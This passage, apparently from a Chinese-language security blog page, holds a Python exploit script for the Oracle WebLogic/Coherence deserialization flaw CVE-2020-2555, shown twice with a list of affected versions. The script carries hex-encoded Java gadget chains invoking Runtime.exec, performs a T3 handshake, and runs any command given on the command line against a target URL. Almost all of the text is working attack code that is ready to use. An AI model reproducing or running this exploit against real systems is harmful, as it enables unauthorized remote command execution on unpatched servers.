096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000047372002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4964656e74697479457874726163746f72936ee080c7259c4b0200007871007e0022000000007372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e002200000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65707400096765744d6574686f647371007e0028000000007571007e002b000000027070740006696e766f6b657371007e0028000000007571007e002b0000000174&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    payload_lenhex &#x3D; &#39;&#123;:04x&#125;&#39;.format(len(cmd))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">    payload_cmdhex &#x3D; binascii.b2a_hex(cmd)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">    payload_end &#x3D; &#39;7400046578656370767200116a6176612e6c616e672e52756e74696d650000000000000000000000787070&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; payload_start + payload_lenhex + payload_cmdhex + payload_end</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">    return payload</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">class payloadtest(object):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">    def __init__(self):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">        self.vuln &#x3D; &#39;cve_2020_2555&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    def t3handshake(self,sock,server_addr):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">        sock.connect(server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">        sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">        time.sleep(1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">        data &#x3D; sock.recv(1024)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">        #print data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">        #print &#39;handshake successful&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">    def buildT3RequestObject(self,sock,port):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">        data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">        data2 &#x3D; &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd60000000700001b19ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">        data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">        data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">        for d in [data1,data2,data3,data4]:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">            sock.send(d.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">        time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">        #print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">    def sendEvilObjData(self,sock,data):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">        payload&#x3D;&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">        payload+&#x3D;data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">        payload+&#x3D;&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line">        payload &#x3D; &#39;%s%s&#39;%(&#39;&#123;:08x&#125;&#39;.format(len(payload)&#x2F;2 + 4),payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">        sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">        time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">        sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">        res &#x3D; &#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">        n&#x3D;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">        try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">            while True:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">                n +&#x3D; 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">                res +&#x3D; sock.recv(4096)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">                time.sleep(0.1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">                if(n&gt;15):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">                    break</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line">        except Exception as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line">            pass</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line">        return res</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">    def check(self, url, cmd,timeout, proxies&#x3D;globalProxies, **args):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line">        (proto, ip, port, uri) &#x3D; parseUrl(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line">        server_addr &#x3D; (ip, int(port))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">93</span></pre></td><td class="code"><pre><span class="line">        if proto &#x3D;&#x3D; &#39;https&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">94</span></pre></td><td class="code"><pre><span class="line">            sock &#x3D; ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">95</span></pre></td><td class="code"><pre><span class="line">        else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">96</span></pre></td><td class="code"><pre><span class="line">            sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">97</span></pre></td><td class="code"><pre><span class="line">        sock.settimeout(timeout)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">98</span></pre></td><td class="code"><pre><span class="line">        try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">99</span></pre></td><td class="code"><pre><span class="line">            self.t3handshake(sock,server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">100</span></pre></td><td class="code"><pre><span class="line">            self.buildT3RequestObject(sock,port)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">101</span></pre></td><td class="code"><pre><span class="line">            payload &#x3D; CVE_2020_2555(cmd)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">102</span></pre></td><td class="code"><pre><span class="line">            resp &#x3D; self.sendEvilObjData(sock,payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">103</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">104</span></pre></td><td class="code"><pre><span class="line">            print (&#39;[+] Payload send succeed! Please check.&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">105</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">106</span></pre></td><td class="code"><pre><span class="line">            return True</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">107</span></pre></td><td class="code"><pre><span class="line">        except Exception as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">108</span></pre></td><td class="code"><pre><span class="line">            print (&#39;[-] Failed! Exception:&#123;&#125;&#39;.format(str(e)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">109</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">110</span></pre></td><td class="code"><pre><span class="line">        return False</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">111</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">112</span></pre></td><td class="code"><pre><span class="line">def poc(url,cmd):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">113</span></pre></td><td class="code"><pre><span class="line">    x &#x3D; payloadtest()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">114</span></pre></td><td class="code"><pre><span class="line">    return x.check(url, cmd,20)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">115</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">116</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">117</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">118</span></pre></td><td class="code"><pre><span class="line">    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Weblogic cve-2020-2555 Exp&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">119</span></pre></td><td class="code"><pre><span class="line">                                     usage&#x3D;&#39;[*] use &quot;python %(prog)s --help&quot; for more information&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">120</span></pre></td><td class="code"><pre><span class="line">                                     formatter_class&#x3D;argparse.RawTextHelpFormatter)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">121</span></pre></td><td class="code"><pre><span class="line">    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">122</span></pre></td><td class="code"><pre><span class="line">                        dest&#x3D;&quot;url&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">123</span></pre></td><td class="code"><pre><span class="line">                        help&#x3D;&quot;the url to check&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">124</span></pre></td><td class="code"><pre><span class="line">                        )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">125</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">126</span></pre></td><td class="code"><pre><span class="line">    parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">127</span></pre></td><td class="code"><pre><span class="line">                        dest&#x3D;&quot;cmd&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">128</span></pre></td><td class="code"><pre><span class="line">                        help&#x3D;&quot;the cmd to run on the target&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">129</span></pre></td><td class="code"><pre><span class="line">                        )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">130</span></pre></td><td class="code"><pre><span class="line">    args &#x3D; parser.parse_args()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">131</span></pre></td><td class="code"><pre><span class="line">    if not args.url or not args.cmd:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">132</span></pre></td><td class="code"><pre><span class="line">        sys.exit(&#39;[*] Please assign url and cmd! \n[*] Examples python cve-2020-2883_cmd.py -u http:&#x2F;&#x2F;127.0.0.1:7001 -c calc&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">133</span></pre></td><td class="code"><pre><span class="line">    poc(args.url, args.cmd)</span></pre></td></tr></table></figure><h1 id="Oracle-Coherence-反序列化漏洞（CVE-2020-2555）"><a href="#Oracle-Coherence-反序列化漏洞（CVE-2020-2555）" class="headerlink" title="Oracle Coherence 反序列化漏洞（CVE-2020-2555）"></a>Oracle Coherence 反序列化漏洞（CVE-2020-2555）</h1><h2 id="version-6"><a href="#version-6" class="headerlink" title="version"></a>version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Oracle weblogic 12.1.3.0.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Oracle weblogic 12.2.1.1.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Oracle weblogic 12.2.1.2.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Oracle weblogic 12.2.1.3.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">Oracle weblogic 12.2.1.4.0</span></pre></td></tr></table></figure><h2 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># from:https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import socket</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">import time</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">import ssl</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">import binascii</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">import urlparse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">import argparse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">globalProxies &#x3D; &#123;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">header &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    &#39;User-Agent&#39;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">def parseUrl(url):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    parsed &#x3D; urlparse.urlparse(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    proto &#x3D; parsed.scheme</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    netloc &#x3D; parsed.netloc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    ip &#x3D; netloc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    if proto &#x3D;&#x3D; &#39;http&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; 80</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; 443</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    if (&#39;:&#39; in netloc):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">        ip &#x3D; netloc.split(&#39;:&#39;)[0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; netloc.split(&#39;:&#39;)[1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">    uri &#x3D; parsed.path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">    return (proto, ip, port, uri)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">def CVE_2020_2555(cmd):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">    payload_start &#x3D; &#39;aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000004374002079736f73657269616c2e7061796c6f6164732e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400096765744f626a6563747371007e000b0000000171007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a7873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c74657299022596d7b4595302000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e0001787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000047372002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4964656e74697479457874726163746f72936ee080c7259c4b0200007871007e0022000000007372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e002200000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65707400096765744d6574686f647371007e0028000000007571007e002b000000027070740006696e766f6b657371007e0028000000007571007e002b0000000174&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    payload_lenhex &#x3D; &#39;&#123;:04x&#125;&#39;.format(len(cmd))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">    payload_cmdhex &#x3D; binascii.b2a_hex(cmd)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">    payload_end &#x3D; &#39;7400046578656370767200116a6176612e6c616e672e52756e74696d650000000000000000000000787070&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; payload_start + payload_lenhex + payload_cmdhex + payload_end</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">    return payload</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">class payloadtest(object):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">    def __init__(self):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">        self.vuln &#x3D; &#39;cve_2020_2555&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    def t3handshake(self,sock,server_addr):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">        sock.connect(server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span 